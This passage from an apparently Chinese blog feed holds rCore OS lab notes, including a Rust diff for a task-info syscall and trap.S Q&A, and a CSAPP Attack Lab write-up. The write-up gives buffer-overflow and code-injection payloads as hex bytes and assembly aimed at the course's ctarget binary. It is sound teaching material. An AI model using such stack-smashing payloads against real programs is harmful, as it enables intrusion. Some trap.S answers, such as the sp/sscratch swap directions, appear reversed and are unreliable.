单页表情况下，如何控制用户态无法访问内核页面？（tips:看看上一题最后一问）</p><p><strong>A2:</strong> 将内核页面的 U 标志位设置为 0.</p><p><strong>Q3:</strong> 单页表有何优势？（回答合理即可）</p><p><strong>A3:</strong> 不需要跳板代码进行用户态和内核态的切换，内核态和用户态切换的速度更快。</p><p><strong>Q4:</strong> 双页表实现下，何时需要更换页表？假设你写一个单页表操作系统，你会选择何时更换页表（回答合理即可）？</p><p><strong>A4:</strong> 双页表实现下，用户态和内核态切换、不同进程切换时需要更换页表。对于单页表操作系统，不同用户线程切换时需要更换页表。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter3练习</title>
    <link href="http://lordaeronesz.github.io/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/</id>
    <published>2024-10-28T15:30:11.000Z</published>
    <updated>2024-11-04T11:42:46.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>rCore 的第一个实验，主要是为了熟悉如何进行内核编程，实现起来比较简单。</p><p>要求实现一个系统调用，填充传入的 <code>TaskInfo</code> 结构体已获取当前任务的一些信息，包含三个字段：任务状态、任务使用的系统调用及调用次数、系统调用时刻距离任务第一次被调度时刻的时长（单位 ms）。</p><p>首先是任务状态，这个比较简单，直接查看当前任务的任务控制块的字段值即可。</p><p>对于系统调用次数，可以在任务控制块中添加新的字段来存储相关信息，例如按提示所说，一个长度为 <code>MAX_SYSCALL_NUM</code> 的整型数组。在函数 <code>syscall/mod.rs:syscall</code> 中，在内核对用户态传入的系统调用号进行分发处理前，增加对应的系统调用桶的计数。注意，由于本次系统调用 <code>sys_task_info</code> 也要进行计数，因此不能在执行了特定的系统调用后再来增加计数，否则本次 <code>sys_task_info</code> 系统调用次数将无法被统计。</p><p>最后是距离任务第一次被调度时刻的时长，一种实现方式是：为任务控制块添加新的字段：<code>time</code>，表示任务第一次被调度的时间。先为 <code>time</code> 设定一个初始值（例如 0），表示该值未被更改过，每当一个任务即将被调度时（如 <code>TASK_MANAGER.run_next_task()</code> 进行任务切换时），查看 <code>time</code> 值，判断是否未被更改：如果是，则赋予当前时间；否则，不做任何操作。这样，就成功保存了任务初次被调度的时刻。在调用 <code>sys_task_info</code> 时，将当前时间减去保存的初次被调度时间，即为时长，注意单位为毫秒。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>由于代码是直接在原项目代码的基础上进行修改，因此为了查看方便，本次及之后实验的代码将以 <code>git diff</code> 的形式展现，加号（绿色）代表添加的代码，减号（红色）代表删除的代码。</p><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex e6e8f98..7f63ed6 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -26,8 +26,13 @@ mod process;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use fs::*;</span><span class="token prefix unchanged"> </span><span class="token line">use process::*;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::task::inc_syscall_times;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 3]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    // increase syscall times before handle specific syscall</span><span class="token prefix inserted">+</span><span class="token line">    inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_WRITE => sys_write(args[0], args[1] as *const u8, args[2]),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_EXIT => sys_exit(args[0] as i32),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex f1cd424..8d01cf4 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,8 +1,9 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    task::&#123;exit_current_and_run_next, suspend_current_and_run_next, TaskStatus&#125;,</span><span class="token prefix deleted">-</span><span class="token line">    timer::get_time_us,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    task::&#123;exit_current_and_run_next, get_current_tcb, suspend_current_and_run_next, TaskStatus&#125;,</span><span class="token prefix inserted">+</span><span class="token line">    timer::&#123;get_time_ms, get_time_us&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -53,5 +54,19 @@ pub fn sys_get_time(ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!("kernel: sys_task_info");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let cur_tcb = get_current_tcb();</span><span class="token prefix inserted">+</span><span class="token line">    // labour in vain! The status must be Running</span><span class="token prefix inserted">+</span><span class="token line">    let status = cur_tcb.task_status;</span><span class="token prefix inserted">+</span><span class="token line">    let syscall_times = cur_tcb.syscall_times;</span><span class="token prefix inserted">+</span><span class="token line">    let time = get_time_ms() - cur_tcb.time;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">        *_ti = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">            status,</span><span class="token prefix inserted">+</span><span class="token line">            syscall_times,</span><span class="token prefix inserted">+</span><span class="token line">            time,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/task/mod.rs b/os/src/task/mod.rsindex c1636ef..4a14e2f 100644<span class="token coord">--- a/os/src/task/mod.rs</span><span class="token coord">+++ b/os/src/task/mod.rs</span>@@ -14,9 +14,11 @@ mod switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#[allow(clippy::module_inception)]</span><span class="token prefix unchanged"> </span><span class="token line">mod task;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MAX_APP_NUM;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MAX_APP_NUM, MAX_SYSCALL_NUM&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::loader::&#123;get_num_app, init_app_cx&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span><span class="token prefix unchanged"> </span><span class="token line">use switch::__switch;</span><span class="token prefix unchanged"> </span><span class="token line">pub use task::&#123;TaskControlBlock, TaskStatus&#125;;</span></span>@@ -54,6 +56,8 @@ lazy_static! &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        let mut tasks = [TaskControlBlock &#123;</span><span class="token prefix unchanged"> </span><span class="token line">            task_cx: TaskContext::zero_init(),</span><span class="token prefix unchanged"> </span><span class="token line">            task_status: TaskStatus::UnInit,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">            time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;; MAX_APP_NUM];</span><span class="token prefix unchanged"> </span><span class="token line">        for (i, task) in tasks.iter_mut().enumerate() &#123;</span><span class="token prefix unchanged"> </span><span class="token line">            task.task_cx = TaskContext::goto_restore(init_app_cx(i));</span></span>@@ -122,6 +126,11 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut inner = self.inner.exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let current = inner.current_task;</span><span class="token prefix unchanged"> </span><span class="token line">            inner.tasks[next].task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if inner.tasks[next].time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                inner.tasks[next].time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            inner.current_task = next;</span><span class="token prefix unchanged"> </span><span class="token line">            let current_task_cx_ptr = &amp;mut inner.tasks[current].task_cx as *mut TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;inner.tasks[next].task_cx as *const TaskContext;</span></span>@@ -135,6 +144,24 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            panic!("All applications completed!");</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get task control block</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_current_tcb(&amp;self) -> TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// Run the first task in task list.</span></span>@@ -169,3 +196,13 @@ pub fn exit_current_and_run_next() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    mark_current_exited();</span><span class="token prefix unchanged"> </span><span class="token line">    run_next_task();</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Get current task control block</span><span class="token prefix inserted">+</span><span class="token line">pub fn get_current_tcb() -> TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.get_current_tcb()</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">pub fn inc_syscall_times(syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.inc_syscall_times(syscall_id)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/os/src/task/task.rs b/os/src/task/task.rsindex e6580c9..4e4c19b 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,6 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::MAX_SYSCALL_NUM;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// The task control block (TCB) of a task.</span><span class="token prefix unchanged"> </span><span class="token line">#[derive(Copy, Clone)]</span></span>@@ -9,6 +10,10 @@ pub struct TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub task_status: TaskStatus,</span><span class="token prefix unchanged"> </span><span class="token line">    /// The task context</span><span class="token prefix unchanged"> </span><span class="token line">    pub task_cx: TaskContext,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// The status of a task</span></span></code></pre><blockquote><p><code>time</code> 的设置有一点小 bug，就是第一个被调度任务的 <code>time</code> 应该在 <code>run_first_task</code> 中设置，否则它的 <code>time</code> 将会晚一个调度周期，testcase 没测出来。。。写博客时才注意到，懒得改了😓</p></blockquote><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p><strong>Q:</strong> 正确进入 U 态后，程序的特征还应有：使用 S 态特权指令，访问 S 态寄存器后会报错。 请同学们可以自行测试这些内容（运行 <a href="https://github.com/LearningOS/rCore-Tutorial-Test-2024A/tree/master/src/bin">三个 bad 测例 (ch2b<em>bad</em>*.rs)</a> ）， 描述程序出错行为，同时注意注明你使用的 sbi 及其版本。</p><p><strong>A:</strong> 略。</p><h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p>深入理解 <a href="https://github.com/LearningOS/rCore-Tutorial-Code-2024A/blob/ch3/os/src/trap/trap.S">trap.S</a> 中两个函数 <code>__alltraps</code> 和 <code>__restore</code> 的作用，并回答如下问题：</p><p><strong>Q1:</strong> L40：刚进入 <code>__restore</code> 时，<code>a0</code> 代表了什么值。请指出 <code>__restore</code> 的两种使用情景。</p><p><strong>A1:</strong> <code>a0</code> 代表了内核栈的栈指针，即 <code>__alltraps</code> 保存的上下文的首地址。</p><p>情景一：表示内核第一次从内核态切换到用户态（或者说将 CPU 所有权转交给用户程序），在初始化或加载应用程序时，内核通过 <code>__restore</code> 恢复必要的状态。</p><p>情景二：当 <code>call trap_handler</code> 执行结束后，程序计数器指向它的下一条指令，即 <code>__restore</code> 的起始地址，表示 Trap 处理完成，将恢复 Trap 时的上下文状态，返回用户态。</p><p><strong>Q2:</strong> L43-L48：这几行汇编代码特殊处理了哪些寄存器？这些寄存器的的值对于进入用户态有何意义？请分别解释。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">ld t0, 32*8(sp)ld t1, 33*8(sp)ld t2, 2*8(sp)csrw sstatus, t0csrw sepc, t1csrw sscratch, t2</code></pre><p><strong>A2:</strong> 特殊处理了 <code>t0</code>、<code>t1</code>、<code>t2</code>、<code>sstatus</code>、<code>sepc</code>、<code>sscratch</code> 寄存器。</p><p><code>t0</code>、<code>t1</code>、<code>t2</code> 用来暂存从内核栈中读取的之前保存的 CSR 寄存器的值，再使用 <code>csrw</code> 指令将暂存值写入对应的 CSR 寄存器中。</p><p>其中 <code>sstatus</code> 的 <code>SPP</code> 字段给出 Trap 发生之前 CPU 处在哪个特权级等信息，<code>sepc</code> 当 Trap 是异常时（exception）记录之前执行的最后一条指令地址，<code>sscratch</code> 则存储着用户栈的栈指针，用于在 <code>sret</code> 返回用户态前使用 <code>csrrw</code> 指令将当前栈指针从内核栈切换到用户栈。</p><p><strong>Q3:</strong> L50-L56：为何跳过了 <code>x2</code> 和 <code>x4</code>？</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">ld x1, 1*8(sp)ld x3, 3*8(sp).set n, 5.rept 27   LOAD_GP %n   .set n, n+1.endr</code></pre><p><strong>A3:</strong> 如下图所示，<code>x2</code> 即 <code>sp</code> 寄存器，保存了内核栈的栈指针。而 <code>x4</code> 寄存器为线程寄存器，在本实验中不会用到。</p><p><img src="/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/reg.png" alt></p><p><strong>Q4:</strong> L60：该指令之后，<code>sp</code> 和 <code>sscratch</code> 中的值分别有什么意义？</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">csrrw sp, sscratch, sp</code></pre><p><strong>A4:</strong> 该指令的作用是先将 <code>sscratch</code> 的值读取到 <code>sp</code> 中，再将 <code>sp</code> 的值写入 <code>sscratch</code> 中，这两个操作是在同一周期内完成的，无需中间寄存器的参与，作用相当于 <code>swap(sp, sscratch)</code>. 在返回用户态之前交换 <code>sp</code> 和 <code>sscratch</code> 的值，即将当前栈指针由用户栈切换到内核栈。</p><p><strong>Q5:</strong> <code>__restore</code>：中发生状态切换在哪一条指令？为何该指令执行之后会进入用户态？</p><p><strong>A5:</strong> 状态切换发生在 <code>sret</code>，该指令会负责从栈中恢复之前保存的程序计数器值，并更新特权级相关的寄存器（如 <code>mstatus</code>）。</p><p><strong>Q6:</strong> L13：该指令之后，<code>sp</code> 和 <code>sscratch</code> 中的值分别有什么意义？</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">csrrw sp, sscratch, sp</code></pre><p><strong>A6:</strong> 与 L60 相反，作用是将当前栈指针由内核栈切换到用户栈，便于后续的 Trap 处理。</p><p><strong>Q7:</strong> 从 U 态进入 S 态是哪一条指令发生的？</p><p><strong>A7:</strong> 根据 Trap 的类型不同而定。对于系统调用而言，是 <code>ecall</code> 指令，对于其它的异常情况（如非法操作、页面缺失等）则是在硬件检测到后自动触发异常，从而进入内核态。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Attack Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/</id>
    <published>2024-09-25T03:45:11.000Z</published>
    <updated>2024-09-25T09:32:48.895Z</updated>
    
    <content type="html"><![CDATA[<p>个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 <strong>缓冲区溢出漏洞</strong> 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。</p><span id="more"></span><p>这个 Lab 上手便给了我当头一棒，在环境配置上琢磨了好一阵。直接运行 <code>./ctarget -q</code> ，程序没有让进行输入，而是直接触发了段错误，后来尝试在跑在学校的 Linux 服务器上得以正常运行，原因不明，推测是 WSL 的锅？？</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/err.png" alt></p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>在倒腾好环境之后，终于可以开始着手完成实验了。</p><p>phase_1 要求我们在调用 <code>getbuf</code> 读取标准输入后，不返回到 <code>test</code> 函数接着执行 <code>printf</code>，而是转而执行 <code>touch1</code>.</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可以利用书中 3.10.3 节提到的知识，向缓冲区中写入过量的数据，大到足以覆盖掉调用 <code>getbuf</code> 时压入栈中的返回地址，将其修改为我们想要跳转执行的程序的起始地址，即可达成目的。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:  4017a8:48 83 ec 28          sub    $0x28,%rsp  4017ac:48 89 e7             mov    %rsp,%rdi  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;  4017b4:b8 01 00 00 00       mov    $0x1,%eax  4017b9:48 83 c4 28          add    $0x28,%rsp  4017bd:c3                   retq     4017be:90                   nop  4017bf:90                   nop</code></pre><p>观察上述函数 <code>getbuf</code> 的汇编代码，从第一条指令 <code>sub  $0x28,%rsp</code>，可以看到函数 <code>getbuf</code> 的栈帧大小为 40 字节。因此要对返回地址进行写入修改，我们可以先写入 40 字节的任意数据，然后再写入 8 字节的目标地址。</p><blockquote><p>这里的“任意”并非真的任意，因为最终的输入是通过字符串的形式来完成的，因此有些特定的字符可能会导致异常，例如 ‘\n’（对应 ASCII 码为 0x0a），这里我选用的 0x3f（向灵神致敬😄）。</p></blockquote><p>最终的攻击数据如下所示：</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fc0 17 40 00 00 00 00 00  &#x2F;&#x2F; 目标地址</code></pre><p>可以借助 <code>hex2raw</code> 工具将 16 进制转换为对应的字符串，再管道给 <code>ctarget</code> 即可。</p><pre class="language-shell" data-language="shell"><code class="language-shell">cat phase_1.txt | .&#x2F;hex2raw | .&#x2F;ctarget -q</code></pre><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p>phase_2 相较于相较于 phase_1，由于要验证参数的正确性，因此只是跳转到目标程序位置还不够，还需要设置参数的值。但原始程序中并没有相关的代码，那参数的值应该如何设置？</p><p>这里必须要有一个理念：站在存储的角度，程序与数据并没有区别，它们都是由 0 和 1 组成的比特流。因此，设置参数的代码我们可以自行编写，将其当作数据进行传入，这样的操作称之为 <strong>代码注入(code injection)</strong> 。最后将我们编写的程序的地址作为返回地址，这样，当程序从 <code>getbuf</code> 返回时，就会跳转到我们先前注入的代码，从而达成目的。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>一种有效的注入代码完成的操作如下：</p><ol><li>写入寄存器 <code>%rdi</code> 的值，使其等于 cookie.</li><li>跳转到程序 <code>touch2</code> 处。</li></ol><p>关于跳转，实验手册中推荐使用 <code>ret</code> 指令，它可看作是两个步骤的综合：首先从栈中弹出地址 A，然后将 PC 值设置为 A。因此想要跳转到 <code>touch2</code>，可以先使用 <code>push</code> 将 <code>touch2</code> 的地址压入栈中，然后使用 <code>ret</code> 实现跳转。</p><p>对于指令的二进制表示，可以先编译： <code>gcc -c ./injec.s</code>，再反汇编：<code>objdump -d ./injec.o</code> 得到。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 8b 3c 25 e4 44 60    mov    0x6044e4,%rdi   7:   00    8:   68 ec 17 40 00          pushq  $0x4017ec   d:   c3                      retq</code></pre><p>另外，要想跳转到注入代码的位置，我们必须首先知道它的地址，由于 ctarget 没有使用 <strong>栈随机化（stack randomization）</strong> ，因此我们完全可以先借助 GDB 打印出调用 <code>Gets</code> 前的栈指针值，再根据注入代码相较于栈指针的偏移计算得到。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-1.png" alt></p><p>最终的攻击数据如下所示：</p><pre class="language-none"><code class="language-none">48 8b 3c 25 e4 44 60 0068 ec 17 40 00 c3 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>最后，想吐槽一点，Attack Lab 貌似没法 GDB 调试 <code>getbuf</code> ？没了调试，在一些简单的错误上面卡半天。。。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-2.png" alt></p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><p>phase_3 和 phase_2 